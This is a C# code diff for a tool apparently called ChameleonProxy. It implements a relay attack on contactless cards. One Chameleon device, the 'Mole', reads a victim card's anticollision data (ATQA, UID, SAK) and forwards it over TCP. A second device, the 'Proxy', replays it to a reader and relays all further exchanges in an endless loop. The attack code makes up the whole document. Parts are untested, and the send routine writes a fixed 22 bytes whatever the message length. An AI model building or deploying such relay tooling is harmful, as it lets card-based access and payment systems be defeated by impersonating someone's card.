@@ -14,7 +14,8 @@ namespace ChameleonProxy
 {
     class Program
     {
-        const int bytesize = 1024 * 1024;
+        const int anticollisionSize = 22;
+        const int bufferSize = 1024;
         static void Main(string[] args)
         {
             // nastavit parametry
@@ -40,6 +41,7 @@ namespace ChameleonProxy
 
         private static void NetworkAttackProxy(ProgramArguments pArgs)
         {
+            Console.WriteLine("** This is Proxy **");
             SerialModuleConfig chameleon2config = new SerialModuleConfig()
             {
                 PortName = pArgs.ProxyComName,
@@ -51,16 +53,43 @@ namespace ChameleonProxy
             ChameleonModule proxy = new ChameleonModule(serial2)
             {
                 Verbose = true,
+                Role = "Proxy",
             };
             Console.WriteLine("** Chameleon Connected  via {0} **", pArgs.ProxyComName);
 
             IPEndPoint ep = new IPEndPoint(IPAddress.Parse(pArgs.MoleIp), int.Parse(pArgs.MolePort));
-            TcpClient client = new TcpClient(ep);
+            TcpClient client = new TcpClient();
+            client.Connect(ep);
             Console.WriteLine("** Client connected to {0}:{1}", ep.Address, ep.Port);
+            var stream = client.GetStream();
+
+            WaitForData(client, ms: 2);
+            string receivedString = ReceiveData(stream);
+            string[] acParameters = receivedString.Split('-');
+            Console.WriteLine("** Received anticollision data {0} **", receivedString);
+
+            string answer = AnticollisionToReader(pArgs.ProxyWaitTime, proxy, acParameters[0], acParameters[1], acParameters[2]);
+
+            do
+            {
+                SendData(stream, answer);
+                WaitForData(client, 2);
+                answer = ReceiveData(stream);
+                answer = proxy.SendWithAnswer(answer);
+            } while (true);
+        }
+
+        private static string ReceiveData(NetworkStream stream)
+        {
+            byte[] buffer = new byte[bufferSize];
+            int readSize = stream.Read(buffer, 0, buffer.Length); // READ
+            var receivedString = Encoding.ASCII.GetString(buffer, 0, readSize);
+            return receivedString;
         }
 
         private static void NetworkAttackMole(ProgramArguments pArgs)
         {
+            Console.WriteLine("** This is Mole **");
             SerialModuleConfig chameleon1Config = new SerialModuleConfig()
             {
                 PortName = pArgs.MoleComName,
@@ -74,21 +103,42 @@ namespace ChameleonProxy
             ChameleonModule mole = new ChameleonModule(serial1)
             {
                 Verbose = true,
+                Role = "Mole",
             };
             CardModule cardMole = new CardModule(mole) { Verbose = true };
             Console.WriteLine("** Chameleon Connected  via {0} **", pArgs.MoleComName);
-
 
             TcpListener listener = new TcpListener(IPAddress.Any, int.Parse(pArgs.MolePort));
             listener.Start();
             Console.WriteLine("** Server Listening for requests at {0}:{1} **\nWaiting for proxy connection...", pArgs.MoleIp, pArgs.MolePort);
 
-            listener.AcceptTcpClient();
-            Console.WriteLine("Proxy connected!");
-            Console.ReadLine();
+            var client = listener.AcceptTcpClient();
+            Console.WriteLine("Proxy connected!\n");
 
+            string Atqa = "";
+            string uid = "";
+            string sak = "";
+            string answer = "";
 
+            AnticollisionWithCard(pArgs.MoleWaitTime, cardMole, ref Atqa, ref uid, ref sak);
 
+            NetworkStream stream = client.GetStream();
+            SendData(stream, $"{Atqa}-{uid}-{sak}");      //SEND
+            do
+            {
+                WaitForData(client, ms: 2);
+
+                answer = ReceiveData(stream);
+                answer = mole.SendWithAnswer(answer);
+                SendData(stream, answer);
+            } while (true);
+
+        }
+
+        private static void SendData(NetworkStream stream, string message)
+        {
+            byte[] data = Encoding.ASCII.GetBytes(message);
+            stream.Write(data, 0, anticollisionSize);
         }
 
         private static void SimpleProxyAttack(int moleWaitTime, int proxyWaitTime, string molePort = "COM3", string proxyPort = "COM4")
@@ -107,6 +157,7 @@ namespace ChameleonProxy
             ChameleonModule mole = new ChameleonModule(serial1)
             {
                 Verbose = true,
+                Role = "Mole",
             };
             CardModule cardMole = new CardModule(mole) { Verbose = true };
             Console.WriteLine("** Chameleon Connected  via {0} **", molePort);
@@ -122,15 +173,59 @@ namespace ChameleonProxy
             ChameleonModule proxy = new ChameleonModule(serial2)
             {
                 Verbose = true,
+                Role = "Proxy",
             };
             Console.WriteLine("** Chameleon Connected  via {0} **", proxyPort);
 
-            bool anticolisionPassed = false;
             string Atqa = "";
             string uid = "";
             string sak = "";
             string answer = "";
+            AnticollisionWithCard(moleWaitTime, cardMole, ref Atqa, ref uid, ref sak);
 
+            answer = AnticollisionToReader(proxyWaitTime, proxy, Atqa, uid, sak);
+            while (true)
+            {
+                //actual proxying
+                answer = mole.SendWithAnswer(answer);
+                answer = proxy.SendWithAnswer(answer);
+                Sleep(proxyWaitTime);
+
+            }
+
+        }
+
+        private static string AnticollisionToReader(int proxyWaitTime, ChameleonModule proxy, string Atqa, string uid, string sak)
+        {
+            string answer = "";
+            bool anticolisionPassed = false;
+            while (!anticolisionPassed)
+            {
+                //anticollise proxy to reader
+                try
+                {
+                    //hope this will work
+                    //assuming reqA has been sent
+                    proxy.Send(Atqa);
+                    Sleep(proxyWaitTime);
+                    proxy.Send(uid);
+                    Sleep(proxyWaitTime);
+                    answer = proxy.SendWithAnswer(sak);
+                    Sleep(proxyWaitTime);
+                    anticolisionPassed = true;
+                }
+                catch (NoDataException)
+                {
+                    anticolisionPassed = false;
+                }
+            }
+            Console.WriteLine("*** anticollision on Proxy passed ***");
+            return answer;
+        }
+
+        private static bool AnticollisionWithCard(int moleWaitTime, CardModule cardMole, ref string Atqa, ref string uid, ref string sak)
+        {
+            bool anticolisionPassed = false;
             while (!anticolisionPassed)
             {
                 try
@@ -144,46 +239,21 @@ namespace ChameleonProxy
                 }
                 catch (NoDataException)
                 {
-                    
+                    continue;
                 }
                 anticolisionPassed = true;
             }
             Console.WriteLine("*** anticollision on mole passed ***");
-            anticolisionPassed = false;
-            while (!anticolisionPassed)
-            {
-                //anticolise proxy to reader
-                try
-                {
-                    //hope this will work
-                    //assuming reqA has been sent
-                    proxy.Send(Atqa);
-                    Sleep(proxyWaitTime);
-                    proxy.Send(uid);
-                    Sleep(proxyWaitTime);
-                    answer = proxy.SendWithAnswer(sak);
-                    Sleep(proxyWaitTime);
-                    anticolisionPassed = true;
-                }
-                catch(NoDataException)
-                {
-anticolisionPassed = false;
-                }
-            }
-            Console.WriteLine("*** anticollision on Proxy passed ***");
-            while (true)
-            {
-                //actual proxying
-                answer = mole.SendWithAnswer(answer);
-                answer = proxy.SendWithAnswer(answer);
-                Sleep(proxyWaitTime);
-
-            }
-
-            Console.ReadLine();
-
+            return anticolisionPassed;
         }
 
+        private static void WaitForData(TcpClient client, int ms)
+        {
+            while (client.Available <= 0)
+            {
+                Sleep(ms);
+            }
+        }
         private static void Sleep(int ms)
         {
             if (ms > 0)
